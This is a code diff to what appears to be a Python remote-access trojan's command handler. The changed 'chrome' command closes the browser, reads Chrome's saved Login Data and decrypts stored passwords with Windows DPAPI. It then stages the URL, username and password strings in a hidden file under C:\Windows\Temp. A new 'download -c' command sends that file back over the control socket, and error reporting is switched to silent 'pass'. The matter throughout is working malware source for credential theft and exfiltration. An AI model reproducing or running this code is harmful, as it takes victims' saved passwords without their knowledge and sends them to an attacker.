@@ -122,12 +122,11 @@ def recieveCommands():
             except:
                 error = RED + BOLD + "[!] Couldn't get virtual ram" + END + '\n'
                 s.send(str.encode(error))
-        elif data[:].decode("utf-8") == 'chrome -p':
+        if data[:].decode("utf-8") == 'chrome':
             try:
                 WMI = GetObject('winmgmts:')
                 processes = WMI.InstancesOf('Win32_Process')
                 chromePath = r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
-
                 def close_chrome():
                     try:
                         if "chrome.exe" in [process.Properties_('Name').Value for process in processes]:
@@ -153,14 +152,30 @@ def recieveCommands():
                         pwd = win32crypt.CryptUnprotectData(pwd)
                         cred[url] = (user_name, pwd[1].decode('utf8'))
                         string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
-                        s.send(str.encode(string))
+                        dirPath = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
+                        path = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom\chromePasses82374.txt'
+                        if not os.path.exists(dirPath):
+                            os.makedirs(dirPath)
+                        f = open(path, 'w')
+                        f.write(string)
+                        f.close()
 
-                    close_chrome()
-                    get_chrome()
+                close_chrome()
+                get_chrome()
 
             except:
-                error = '\n' + RED + BOLD + '[!] There was an error getting saved chrome passwords' + END + '\n'
-                s.send(str.encode(error))
+                pass
+        elif data[:].decode("utf-8") == 'download -c':
+            try:
+                dirPath = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
+                if not os.path.isdir(dirPath):
+                    os.makedirs(dirPath)
+                    print('Changed')
+                file = open(os.path.join(dirPath + r"\chromePasses82374.txt"), "rb")
+                file_data = file.read(1024)
+                s.send(file_data)
+            except:
+                pass
         elif data[:4].decode("utf-8") == 'lock':
             try:
                 successSend = ('\n' + GREEN + BOLD + '[*] Successfully locked computer screen' + END + '\n')
